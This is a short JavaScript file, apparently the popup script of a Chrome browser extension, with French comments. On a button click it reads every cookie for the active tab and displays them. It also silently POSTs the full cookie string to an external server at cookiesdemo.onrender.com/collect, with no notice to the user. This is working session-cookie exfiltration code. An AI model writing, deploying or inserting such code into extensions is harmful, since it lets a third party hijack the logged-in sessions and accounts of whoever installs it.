document.getElementById("getCookies").addEventListener("click", () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tab = tabs[0];
    if (!tab || !tab.url) return;

    chrome.cookies.getAll({ url: tab.url }, (cookies) => {
      const container = document.getElementById("cookies");

      if (!cookies || cookies.length === 0) {
        container.textContent = "aucun cookies récuperer";
        return;
      }

      const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
      container.textContent = cookieString;

      // Envoi vers le serveur Render
      fetch("https://cookiesdemo.onrender.com/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookies: cookieString })
      })
        .then(() => console.log("Cookies envoyés au serveur !"))
        .catch(err => console.error("Erreur :", err));
    });
  });
});
